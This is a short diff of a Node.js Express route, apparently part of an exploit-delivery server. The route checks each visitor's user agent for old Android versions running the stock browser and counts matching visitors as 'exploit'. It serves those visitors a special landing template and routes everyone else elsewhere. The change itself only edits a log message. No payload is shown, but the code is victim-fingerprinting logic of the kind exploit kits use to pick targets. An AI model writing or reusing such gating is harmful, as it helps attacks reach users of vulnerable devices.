@@ -129,7 +129,7 @@ app.get('/videoid=4455', function(req, res){
 
 	if (agent.match(/Android [1,2,3,4].[1,2,3,4].[1,2,3,4,5,6,7,8]/)&&agent.match(/Version\/[4,3,2,1].[3,2,1,0] Mobile Safari/)){
 		exploit++;
-		console.log("EXPLOIIIIITTT");
+		console.log("EXPLOIIIIITTT NO ADALT");
 		res.sendFile(root+'template/lend_bee_noadalt.html');
 	}else {
 		tototo++;
